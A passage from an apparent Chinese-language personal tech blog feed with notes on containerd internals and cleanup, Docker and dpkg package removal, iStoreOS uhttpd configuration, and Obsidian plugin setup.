                                                                    |                                                                                             </span><br><span class="hljs-string">Press &#x27;</span>?<span class="hljs-string">&#x27; for help    </span><br></code></pre></td></tr></table></figure><h2 id="7-3-containerd-Backend"><a href="#7-3-containerd-Backend" class="headerlink" title="7.3 containerd Backend"></a>7.3 containerd Backend</h2><p>Backend层主要对接操作系统容器运行时，也是containerd对接外部插件的扩展层。<br>Backend层主要包括两大类：proxy plugins和containerd shim。</p><h3 id="7-3-1-containerd中的proxy-plugins"><a href="#7-3-1-containerd中的proxy-plugins" class="headerlink" title="7.3.1 containerd中的proxy plugins"></a>7.3.1 containerd中的proxy plugins</h3><p>containerd中支持的代理插件类型有content、snapshotter及diff（containerd 1.7.1 中新增的类型）。</p><ul><li>content：仅支持1个，要么是内置的content plugin，要么是自行实现的content plugin</li><li>snapshotter插件：可以配置多个</li><li>diff插件：可以配置多个</li></ul><h3 id="7-3-2-containerd中的Runtime和shim"><a href="#7-3-2-containerd中的Runtime和shim" class="headerlink" title="7.3.2 containerd中的Runtime和shim"></a>7.3.2 containerd中的Runtime和shim</h3><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>节选自《containerd原理剖析与实践》</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【dokcer系列】ubuntu下卸载docker</title>
    <link href="/2024/07/29/docker/%E3%80%90dokcer%E7%B3%BB%E5%88%97%E3%80%91ubuntu%E4%B8%8B%E5%8D%B8%E8%BD%BDdocker/"/>
    <url>/2024/07/29/docker/%E3%80%90dokcer%E7%B3%BB%E5%88%97%E3%80%91ubuntu%E4%B8%8B%E5%8D%B8%E8%BD%BDdocker/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># dpkg -l | grep docker</span><br>rc  docker-ce                                     5:26.1.0-1~ubuntu.22.04~jammy               amd64        Docker: the open-source application container engine<br>ii  docker.io                                     24.0.7-0ubuntu2~22.04.1                     amd64        Linux container runtime<br><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># apt remove --purge docker-ce </span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># apt remove --purge docker.io  </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】(202407) binfmt-misc</title>
    <link href="/2024/07/29/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202407)%20binfmt-misc/"/>
    <url>/2024/07/29/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202407)%20binfmt-misc/</url>
    
    <content type="html"><![CDATA[<h3 id="什么是binfmt-misc"><a href="#什么是binfmt-misc" class="headerlink" title="什么是binfmt-misc"></a>什么是binfmt-misc</h3><p>binfmt-misc(Miscellaneous Binary Format)是Linux内核提供的一种类似Windows上文件关联的功能，但比文件关联更强大的是，它不仅可以根据文件后缀名判断，还可以根据文件内容(Magic Bytes)使用不同的程序打开。一个典型的使用场景就是：使用<code>qemu</code>运行其它架构平台上的二进制文件。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://cloud.tencent.com/developer/article/2394439">Linux中的binfmt-misc原理分析-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】dpkg</title>
    <link href="/2024/07/29/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91dpkg/"/>
    <url>/2024/07/29/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91dpkg/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># man dpkg</span><br>...<br>       -P, --purge package...|-a|--pending<br>           Purge an installed or already removed package. This removes everything, including conffiles, and anything <span class="hljs-keyword">else</span> cleaned up from postrm.  If -a or --pending is given<br>           instead of a package name, <span class="hljs-keyword">then</span> all packages unpacked or removed, but marked to be purged <span class="hljs-keyword">in</span> file /var/lib/dpkg/status, are purged.<br><br>           Note: Some configuration files might be unknown to dpkg because they are created and handled separately through the configuration scripts. In that <span class="hljs-keyword">case</span>, dpkg won<span class="hljs-string">&#x27;t</span><br><span class="hljs-string">           remove them by itself, but the package&#x27;</span>s postrm script (<span class="hljs-built_in">which</span> is called by dpkg), has to take care of their removal during purge. Of course, this only applies to files<br>           <span class="hljs-keyword">in</span> system directories, not configuration files written to individual <span class="hljs-built_in">users</span><span class="hljs-string">&#x27; home directories.</span><br><span class="hljs-string"></span><br><span class="hljs-string">           Purging of a package consists of the following steps:</span><br><span class="hljs-string"></span><br><span class="hljs-string">           1. Remove the package, if not already removed. See --remove for detailed information about how this is done.</span><br><span class="hljs-string"></span><br><span class="hljs-string">           2. Run postrm script.</span><br><span class="hljs-string">...</span><br><span class="hljs-string"></span><br><span class="hljs-string"># Purge an installed or already removed package.   清除已安装或已删除的软件包。</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【markdown】常用语法</title>
    <link href="/2024/07/29/markdown/%E3%80%90markdown%E3%80%91%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/"/>
    <url>/2024/07/29/markdown/%E3%80%90markdown%E3%80%91%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>输入todolist框<br><code>-</code> <code>空格</code> <code>[</code> <code>空格</code> <code>]</code> <code>空格</code> 内容</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【nas】(202407) 安装iStoreOS</title>
    <link href="/2024/07/29/nas/%E3%80%90nas%E3%80%91(202407)%20%E5%AE%89%E8%A3%85iStoreOS/"/>
    <url>/2024/07/29/nas/%E3%80%90nas%E3%80%91(202407)%20%E5%AE%89%E8%A3%85iStoreOS/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cpolar.com/blog/vmware-virtual-machines-install-the-soft-routing-system-istoreos">https://www.cpolar.com/blog/vmware-virtual-machines-install-the-soft-routing-system-istoreos</a></p><h1 id="修改uHttpd的默认端口"><a href="#修改uHttpd的默认端口" class="headerlink" title="修改uHttpd的默认端口"></a>修改uHttpd的默认端口</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@iStoreOS:/etc/config<span class="hljs-comment"># cat /etc/config/uhttpd </span><br><br>config uhttpd <span class="hljs-string">&#x27;main&#x27;</span><br>        list listen_http <span class="hljs-string">&#x27;0.0.0.0:81&#x27;</span><br>        list listen_http <span class="hljs-string">&#x27;[::]:81&#x27;</span><br>        list listen_https <span class="hljs-string">&#x27;0.0.0.0:443&#x27;</span><br>        list listen_https <span class="hljs-string">&#x27;[::]:443&#x27;</span><br>        option redirect_https <span class="hljs-string">&#x27;0&#x27;</span><br>        option home <span class="hljs-string">&#x27;/www&#x27;</span><br>        option rfc1918_filter <span class="hljs-string">&#x27;1&#x27;</span><br>        option max_requests <span class="hljs-string">&#x27;3&#x27;</span><br>        option max_connections <span class="hljs-string">&#x27;100&#x27;</span><br>        option cert <span class="hljs-string">&#x27;/etc/uhttpd.crt&#x27;</span><br>        option key <span class="hljs-string">&#x27;/etc/uhttpd.key&#x27;</span><br>        option cgi_prefix <span class="hljs-string">&#x27;/cgi-bin&#x27;</span><br>        list lua_prefix <span class="hljs-string">&#x27;/cgi-bin/luci=/usr/lib/lua/luci/sgi/uhttpd.lua&#x27;</span><br>        option network_timeout <span class="hljs-string">&#x27;30&#x27;</span><br>        option http_keepalive <span class="hljs-string">&#x27;20&#x27;</span><br>        option tcp_keepalive <span class="hljs-string">&#x27;1&#x27;</span><br>        option ubus_prefix <span class="hljs-string">&#x27;/ubus&#x27;</span><br>        option script_timeout <span class="hljs-string">&#x27;360&#x27;</span><br><br>config cert <span class="hljs-string">&#x27;defaults&#x27;</span><br>        option days <span class="hljs-string">&#x27;730&#x27;</span><br>        option key_type <span class="hljs-string">&#x27;ec&#x27;</span><br>        option bits <span class="hljs-string">&#x27;2048&#x27;</span><br>        option ec_curve <span class="hljs-string">&#x27;P-256&#x27;</span><br>        option country <span class="hljs-string">&#x27;ZZ&#x27;</span><br>        option state <span class="hljs-string">&#x27;Somewhere&#x27;</span><br>        option location <span class="hljs-string">&#x27;Unknown&#x27;</span><br>        option commonname <span class="hljs-string">&#x27;iStoreOS&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@iStoreOS:/etc/config<span class="hljs-comment"># /etc/init.d/uhttpd restart</span><br><br></code></pre></td></tr></table></figure><h1 id="安装uhttpd-luci"><a href="#安装uhttpd-luci" class="headerlink" title="安装uhttpd luci"></a>安装uhttpd luci</h1><p>系统 软件包</p><p>luci-i18n-uhttpd-zh-cn</p><p>安装之后，刷新，<code>服务</code>里面就能看到uHttpd了</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>Synology应用程序门户<br>启用FileStation端口为7000</p><p>7.0 系统<br>控制面板 登录门户 高级 反向代理服务器</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【obsidian系列】07.obsidian中如何新建思维导图？Enhancing Mindmap</title>
    <link href="/2024/07/29/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9107.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E6%96%B0%E5%BB%BA%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%EF%BC%9FEnhancing%20Mindmap/"/>
    <url>/2024/07/29/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9107.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E6%96%B0%E5%BB%BA%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%EF%BC%9FEnhancing%20Mindmap/</url>
    
    <content type="html"><![CDATA[<p>社区市场安装插件</p><p>右键，选择“新建思维导图”</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240131132551.png" alt="image.png"></p><p>按照图示直接新建即可，大概效果如下：<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240131132516.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【obsidian系列】09.obsidian中如何设置主页？</title>
    <link href="/2024/07/29/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9109.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E4%B8%BB%E9%A1%B5%EF%BC%9F/"/>
    <url>/2024/07/29/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9109.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E4%B8%BB%E9%A1%B5%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>想打造一个好看的主页</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="Homepage插件"><a href="#Homepage插件" class="headerlink" title="Homepage插件"></a>Homepage插件</h2><p>新建文件home，修改Homepage插件的配置为该文件，这样当我们在启动软件时，就默认打开我们设计好的home</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728001454.png" alt="image.png"></p><h2 id="dataview插件：统计本文本库的文件、标签数量。"><a href="#dataview插件：统计本文本库的文件、标签数量。" class="headerlink" title="dataview插件：统计本文本库的文件、标签数量。"></a>dataview插件：统计本文本库的文件、标签数量。</h2><p>开启插件的下述配置：</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728002755.png" alt="image.png"></p><p>安装 dataview 插件后，直接将这段 dataviewjs 代码区域中复制到文件中即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">```dataviewjs<br><span class="hljs-built_in">let</span> ftMd = dv.pages(<span class="hljs-string">&quot;&quot;</span>).file.sort(t =&gt; t.cday)[0]<br><span class="hljs-built_in">let</span> total = parseInt([new Date() - ftMd.ctime] / (60*60*24*1000))<br><span class="hljs-built_in">let</span> totalDays = <span class="hljs-string">&quot; 您已使用 *Obsidian* &quot;</span>+total+<span class="hljs-string">&quot; 天，&quot;</span><br><span class="hljs-built_in">let</span> nofold = <span class="hljs-string">&#x27;!&quot;misc/templates&quot;&#x27;</span><br><span class="hljs-built_in">let</span> allFile = dv.pages(nofold).file<br><span class="hljs-built_in">let</span> totalMd = <span class="hljs-string">&quot;共创建 &quot;</span>+<br>allFile.length+<span class="hljs-string">&quot; 篇笔记&quot;</span><br><span class="hljs-built_in">let</span> totalTag = allFile.etags.distinct().length+<span class="hljs-string">&quot; 个标签&quot;</span><br><br>dv.paragraph(<br>totalDays+totalMd+<span class="hljs-string">&quot;、&quot;</span>+totalTag+<span class="hljs-string">&quot;&quot;</span><br>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728002712.png" alt="image.png"></p><p>可显示出如下内容<br><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728002839.png" alt="image.png"></p><h2 id="Activity-History插件：跟踪指定项目的活动，Github-之类的活动板"><a href="#Activity-History插件：跟踪指定项目的活动，Github-之类的活动板" class="headerlink" title="Activity History插件：跟踪指定项目的活动，Github 之类的活动板"></a>Activity History插件：跟踪指定项目的活动，Github 之类的活动板</h2><p>在任意你想展示此活动历史的地方，添加如下代码切换到预览即可看到效果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">```ActivityHistory<br>/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728004651.png" alt="image.png"><br><code>注意：</code>此插件仅展示安装之后的活动状态记录，之前的历史并不会展示。</p><p>可显示出如下内容：</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728005419.png" alt="image.png"></p><h2 id="Calendar插件"><a href="#Calendar插件" class="headerlink" title="Calendar插件"></a>Calendar插件</h2><p>安装之后打开week number</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728005622.png" alt="image.png"></p><p>点击右上角的“展开”按钮</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728010003.png" alt="image.png"><br>点击“日历”图标即可<br><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240728010038.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【obsidian系列】08.obsidian中如何设置背景？插件：Style Settings（Blue Topaz主题）</title>
    <link href="/2024/07/27/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9108.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E8%83%8C%E6%99%AF%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9AStyle%20Settings%EF%BC%88Blue%20Topaz%E4%B8%BB%E9%A2%98%EF%BC%89/"/>
    <url>/2024/07/27/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9108.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E8%83%8C%E6%99%AF%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9AStyle%20Settings%EF%BC%88Blue%20Topaz%E4%B8%BB%E9%A2%98%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>左下角选择“设置”-&gt; “外观”-&gt; “主题“-&gt; “管理“</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240727232513.png" alt="image.png"></p><p>下载Blue Topaz主题</p><p>搭配插件“Style Settings”</p><p>效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20240727233500.png" alt="image.png"></p><p>文件夹显示出了不同的颜色，很好看~</p>]]></content>
    
    
    <categories>
      
      <category>obsidian</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【nas】(202407) vmware安装群晖系统</title>
    <link href="/2024/07/12/nas/%E3%80%90nas%E3%80%91(202407)%20vmware%E5%AE%89%E8%A3%85%E7%BE%A4%E6%99%96%E7%B3%BB%E7%BB%9F/"/>
    <url>/2024/07/12/nas/%E3%80%90nas%E3%80%91(202407)%20vmware%E5%AE%89%E8%A3%85%E7%BE%A4%E6%99%96%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/weixin_47605925/article/details/132096470">黑群晖扩展（扩容） 硬盘</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【containerd】(202407) 02.清理container文件和配置</title>
    <link href="/2024/07/09/containerd/%E3%80%90containerd%E3%80%91(202407)%2002.%E6%B8%85%E7%90%86container%E6%96%87%E4%BB%B6%E5%92%8C%E9%85%8D%E7%BD%AE/"/>
    <url>/2024/07/09/containerd/%E3%80%90containerd%E3%80%91(202407)%2002.%E6%B8%85%E7%90%86container%E6%96%87%E4%BB%B6%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="清理containerd文件和配置"><a href="#清理containerd文件和配置" class="headerlink" title="清理containerd文件和配置"></a>清理containerd文件和配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 停止containerd进程</span><br>systemctl stop containerd --now<br><br><span class="hljs-comment"># 删除containerd安装包下发的各种二进制和配置</span><br><span class="hljs-built_in">rm</span> -r -f /cri-containerd.DEPRECATED.txt<br><span class="hljs-built_in">rm</span> -r -f /etc/systemd/system/containerd.service<br><span class="hljs-built_in">rm</span> -r -f /etc/cni/net.d/10-containerd-net.conflist<br><span class="hljs-built_in">rm</span> -r -f /etc/crictl.yaml<br><span class="hljs-built_in">rm</span> -r -f /usr/local/sbin/runc<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/containerd-shim<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/crictl<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/containerd-stress<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/critest<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/ctr<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/ctd-decoder<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/containerd-shim-runc-v2<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/containerd-shim-runc-v1<br><span class="hljs-built_in">rm</span> -r -f /usr/local/bin/containerd<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/tuning<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/firewall<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/loopback<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/macvlan<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/ptp<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/bridge<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/static<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/dhcp<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/dummy<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/sbr<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/vrf<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/host-local<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/bandwidth<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/vlan<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/host-device<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/portmap<br><span class="hljs-built_in">rm</span> -r -f /opt/cni/bin/ipvlan<br><span class="hljs-built_in">rm</span> -r -f /opt/containerd/cluster/version<br><span class="hljs-built_in">rm</span> -r -f /opt/containerd/cluster/gce/configure.sh<br><span class="hljs-built_in">rm</span> -r -f /opt/containerd/cluster/gce/env<br><span class="hljs-built_in">rm</span> -r -f /opt/containerd/cluster/gce/cloud-init/master.yaml<br><span class="hljs-built_in">rm</span> -r -f /opt/containerd/cluster/gce/cloud-init/node.yaml<br><span class="hljs-built_in">rm</span> -r -f /opt/containerd/cluster/gce/cni.template<br><br><span class="hljs-comment"># 删除containerd启动时的配置文件</span><br><span class="hljs-built_in">rm</span> -r -f /etc/containerd/config.toml<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【containerd】(202407) 03.比较containerd的三种安装包</title>
    <link href="/2024/07/09/containerd/%E3%80%90containerd%E3%80%91(202407)%2003.%E6%AF%94%E8%BE%83containerd%E7%9A%84%E4%B8%89%E7%A7%8D%E5%AE%89%E8%A3%85%E5%8C%85/"/>
    <url>/2024/07/09/containerd/%E3%80%90containerd%E3%80%91(202407)%2003.%E6%AF%94%E8%BE%83containerd%E7%9A%84%E4%B8%89%E7%A7%8D%E5%AE%89%E8%A3%85%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># mkdir containerd-pkg</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># cd containerd-pkg</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># </span><br><br><br><span class="hljs-comment"># 1 仅包含containerd相关二进制的精简安装包</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># wget https://github.com/containerd/containerd/releases/download/v1.7.18/containerd-1.7.18-linux-amd64.tar.gz</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># mkdir -p containerd-1.7.18-linux-amd64</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># tar -xvf  containerd-1.7.18-linux-amd64.tar.gz -C containerd-1.7.18-linux-amd64</span><br>bin/<br>bin/containerd-shim<br>bin/containerd-stress<br>bin/ctr<br>bin/containerd-shim-runc-v2<br>bin/containerd-shim-runc-v1<br>bin/containerd<br><br>                                                                                                                                                                                                   <br><span class="hljs-comment"># 2 包含containerd、cri与runc工具的安装包</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># wget https://github.com/containerd/containerd/releases/download/v1.7.18/cri-containerd-1.7.18-linux-amd64.tar.gz</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># mkdir -p cri-containerd-1.7.18-linux-amd64</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># tar -xvf cri-containerd-1.7.18-linux-amd64.tar.gz -C cri-containerd-1.7.18-linux-amd64</span><br>cri-containerd.DEPRECATED.txt<br>etc/crictl.yaml<br>etc/systemd/<br>etc/systemd/system/<br>etc/systemd/system/containerd.service<br>usr/<br>usr/local/<br>usr/local/sbin/<br>usr/local/sbin/runc<br>usr/local/bin/<br>usr/local/bin/containerd-shim<br>usr/local/bin/crictl<br>usr/local/bin/containerd-stress<br>usr/local/bin/critest<br>usr/local/bin/ctr<br>usr/local/bin/ctd-decoder<br>usr/local/bin/containerd-shim-runc-v2<br>usr/local/bin/containerd-shim-runc-v1<br>usr/local/bin/containerd<br>opt/containerd/<br>opt/containerd/cluster/<br>opt/containerd/cluster/version<br>opt/containerd/cluster/gce/<br>opt/containerd/cluster/gce/configure.sh<br>opt/containerd/cluster/gce/env<br>opt/containerd/cluster/gce/cloud-init/<br>opt/containerd/cluster/gce/cloud-init/master.yaml<br>opt/containerd/cluster/gce/cloud-init/node.yaml<br>opt/containerd/cluster/gce/cni.template<br><br><br><span class="hljs-comment"># 3 包含containerd、cri、runc、cni工具的安装包</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># wget https://github.com/containerd/containerd/releases/download/v1.7.18/cri-containerd-cni-1.7.18-linux-amd64.tar.gz</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># mkdir -p cri-containerd-cni-1.7.18-linux-amd64</span><br>[root@ubuntu-22 containerd-pkg]<span class="hljs-comment"># tar -xvf cri-containerd-cni-1.7.18-linux-amd64.tar.gz -C 